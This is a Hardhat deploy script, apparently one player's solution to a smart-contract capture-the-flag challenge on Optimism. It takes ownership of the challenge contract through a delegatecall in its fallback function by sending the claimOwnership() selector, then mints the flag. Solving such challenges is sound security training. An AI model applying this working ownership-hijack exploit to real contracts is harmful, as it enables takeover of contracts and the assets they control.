import { HardhatRuntimeEnvironment } from "hardhat/types";
import { DeployFunction } from "hardhat-deploy/types";

const deployS1Challenge7: DeployFunction = async function (hre: HardhatRuntimeEnvironment) {
  const { deployer } = await hre.getNamedAccounts();
  const { ethers } = hre;

  const challengeAddress = "0xC962D4f4E772415475AA46Eed06cb1F2D4010c0A";
  const challengeContract = await ethers.getContractAt("Season1Challenge7", challengeAddress);

  console.log("-------------------------------------------------------");
  console.log(`🚀 Attacking Challenge 7 for: ${deployer}`);

  // 1. Prepare the data for "claimOwnership()"
  // We need the 4-byte selector of the function in the Delegate contract
  const fragment = new ethers.Interface(["function claimOwnership() public"]);
  const data = fragment.getFunction("claimOwnership")?.selector;

  console.log("🛰  Sending delegatecall to hijack ownership...");

  try {
    // 2. Send the transaction to the FALLBACK function
    const tx1 = await (
      await ethers.getSigner(deployer)
    ).sendTransaction({
      to: challengeAddress,
      data: data,
    });
    await tx1.wait();
    console.log("🔑 Ownership hijacked!");

    // Verify ownership
    const currentOwner = await challengeContract.owner();
    console.log(`Current Owner: ${currentOwner}`);

    if (currentOwner.toLowerCase() === deployer.toLowerCase()) {
      console.log("✨ Success! You are the owner. Now minting...");

      // 3. Call mintFlag() now that you are the owner
      const tx2 = await challengeContract.mintFlag();
      await tx2.wait();
      console.log("🚩 Flag #11 (S1 Ch7) is yours!");
    }
  } catch (error: any) {
    console.log("❌ Failed!");
    console.error("Reason:", error.reason || error.message);
  }
};

export default deployS1Challenge7;
deployS1Challenge7.tags = ["S1Challenge7"];

// yarn deploy --tags S1Challenge7 --network optimism
